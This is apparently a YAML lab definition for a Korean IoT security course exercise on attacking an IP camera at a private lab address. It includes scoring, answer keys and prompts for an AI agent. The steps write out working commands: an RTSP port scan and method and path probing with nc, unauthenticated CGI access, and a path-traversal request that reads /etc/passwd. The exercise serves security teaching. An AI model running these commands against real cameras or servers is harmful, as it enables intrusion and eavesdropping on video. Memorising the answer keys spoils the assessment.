lab_id: iot-security-ai-week09
title: IP Camera 해킹 (AI 지원)
version: ai
course: iot-security-ai
week: 9
description: RTSP 프로토콜 분석, 카메라 웹 인터페이스 공격, 기본 인증 브루트포스를 실습합니다.
difficulty: medium
duration_minutes: 120
objectives:
- RTSP 서비스를 스캔하고 정보를 수집한다
- IP 카메라 기본 비밀번호를 테스트한다
- 카메라 웹 인터페이스의 취약점을 공략한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 대상 서버의 RTSP 포트(554, 8554)를 스캔하시오.
  hint: nmap -sV -p 554,8554 명령을 사용하세요.
  category: recon
  points: 10
  answer: nmap -sV -p 554,8554 10.20.30.80 2>/dev/null && echo 'RTSP 스캔 완료'
  answer_detail: RTSP 서비스는 주로 554 또는 8554 포트에서 동작합니다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: nmap -sV -p 554,8554 10.20.30.80 2>/dev/null && echo 'RTSP 스캔 완료'
  risk_level: low
  bastion_prompt: 대상 서버의 RTSP 포트(554, 8554)를 스캔해줘
- order: 2
  instruction: RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인하시오.
  hint: echo "OPTIONS rtsp://host/live RTSP/1.0\r\nCSeq:1\r\n" | nc 명령을 사용하세요.
  category: rtsp
  points: 10
  answer: "printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80 8554 2>/dev/null; echo 'RTSP OPTIONS 완료'"
  answer_detail: OPTIONS 메서드로 RTSP 서버가 지원하는 기능(DESCRIBE, SETUP, PLAY 등)을 확인합니다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: "printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80 8554 2>/dev/null; echo 'RTSP OPTIONS 완료'"
  risk_level: low
  bastion_prompt: RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인해줘
- order: 3
  instruction: 일반적인 RTSP 경로(/live, /h264, /stream, /Streaming/Channels/101)를 테스트하시오.
  hint: 여러 경로로 DESCRIBE 요청을 보내세요.
  category: rtsp
  points: 12
  answer: 'for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
  answer_detail: IP 카메라 제조사마다 서로 다른 RTSP 경로를 사용합니다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq: 1\r\n\r\n" | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
  risk_level: low
  bastion_prompt: 일반적인 RTSP 경로(/live, /h264, /stream, /Streaming/Channels/101)를 테스트해줘
- order: 4
  instruction: 카메라 웹 인터페이스(8089)의 CGI 경로에 미인증으로 접근하시오.
  hint: /cgi-bin/config.cgi 경로를 시도하세요.
  category: web
  points: 12
  answer: curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5; echo 'CGI 접근 테스트 완료'
  answer_detail: 인증 없이 CGI에 직접 접근할 수 있으면 카메라 설정 정보가 노출됩니다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5; echo 'CGI 접근 테스트 완료'
  risk_level: low
  bastion_prompt: 카메라 웹 인터페이스(8089)의 CGI 경로에 미인증으로 접근해줘
- order: 5
  instruction: 경로 탐색 공격으로 서버의 /etc/passwd 파일을 읽으시오.
  hint: file=../../etc/passwd 파라미터를 사용하세요.
  category: web
  points: 12
  answer: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null | head -5; echo '경로 탐색 테스트 완료'
  answer_detail: 경로 탐색(Path Traversal) 취약점으로 서버의 임의 파일을 읽을 수 있습니다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null | head -5; echo '경로 탐색 테스트 완료'
  risk_level: low
  bastion_prompt: 경로 탐색 공격으로 서버의 /etc/passwd 파일을 읽으시오해줘
- order: 6
  instruction: IP 카메라 보안 점검 보고서를 작성하시오.
  hint: RTSP 인증, 웹 취약점, 기본 설정을 포함하세요.
  category: verification
  points: 10
  answer: echo '=== IP 카메라 보안 보고서 ===' && echo '[Critical] CGI 미인증 접근 → 설정 노출' && echo '[High] 경로 탐색 → 파일 읽기' && echo '[High] RTSP 미인증 → 영상 도청' && echo '[권장] RTSP Digest 인증, CGI 인증, 입력 검증' && echo '===
    보고서 완료 ==='
  answer_detail: IP 카메라는 물리적 보안과 직결되므로 취약점 패치가 시급합니다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: echo '=== IP 카메라 보안 보고서 ===' && echo '[Critical] CGI 미인증 접근 → 설정 노출' && echo '[High] 경로 탐색 → 파일 읽기' && echo '[High] RTSP 미인증 → 영상 도청' && echo '[권장] RTSP Digest 인증, CGI 인증, 입력 검증' && echo '===
    보고서 완료 ==='
  risk_level: low
  bastion_prompt: IP 카메라 보안 점검 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
